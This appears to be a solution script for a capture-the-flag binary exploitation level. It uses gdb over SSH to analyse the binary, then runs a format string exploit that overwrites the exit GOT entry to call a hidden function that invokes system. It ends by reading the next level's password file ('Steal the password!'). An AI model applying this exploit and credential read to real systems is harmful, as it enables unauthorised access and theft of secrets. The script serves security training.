import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, exec_in_stream, exec_stream, find_buffer_position, get_func_address
from utils.text import print_output, print_title
from utils.base import save_token, get_rewrite_stack_command

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

stream = exec_stream(f'./{binary_name}', title='Simple execute binary', stdin=True)
print_title('Okay, stdin intercepted, stdin write expected')

output = exec_in_stream(stream, 'test', title='Send test in stdin')
print_output(output)
print_title('Nothing happened')
print_title('Debug Time')

func_info = exec(
    client, f'echo "info func" | gdb ./{binary_name} -q | egrep " n$| main$| o$"', title='Get all functions')
print_output(func_info)
print_title(f'We have three entry points')

main_structure = exec(client, f'echo "disass main" | gdb ./{binary_name} -q', title='Get main structure')
print_output(main_structure)
print_title('Main call function `n`')

n_structure = exec(client, f'echo "disass n" | gdb ./{binary_name} -q', title='Get N structure')
print_output(n_structure)
print_title('Read stdin and print it via printf, after - exit, pretty simple')

print_title('Main and N not call func O, reverse it too')
o_structure = exec(client, f'echo "disass o" | gdb ./{binary_name} -q', title='Get O structure')
o_address = get_func_address(client, 'o')
print_output(o_structure)
print_title('Call system and close the program, all we need to do, call this function anyway')

exit_address = get_func_address(client, 'exit')
print_output(exit_address, 'Exit address')
print_title('But this address not real, find a little deeper')

exit_address = exec(client, f'echo "x/i {exit_address}" '
                            f'| gdb ./{binary_name} -q '
                            f'| grep "exit" '
                            f'| awk \'{{print $5}}\' | sed \'s/*//\'', title='Find real exit address')[0]
print_output(exit_address, 'Real exit address')

buffer_position = find_buffer_position(client, title='Replace exit by call `o` func via format string exploit')
script = get_rewrite_stack_command(exit_address, o_address, buffer_position, 4)
f = lambda command: f'echo {command} | ({script}; cat -) | ./{binary_name} | cut -c 134512641-134512705'

output = exec(client, f('whoami'), title='Who a me?')
print_output(output, 'Current user')
print_title('Nice')

token = exec(client, f('cat /home/user/level6/.pass'), title='Steal the password!')[0]
save_token(token, client)
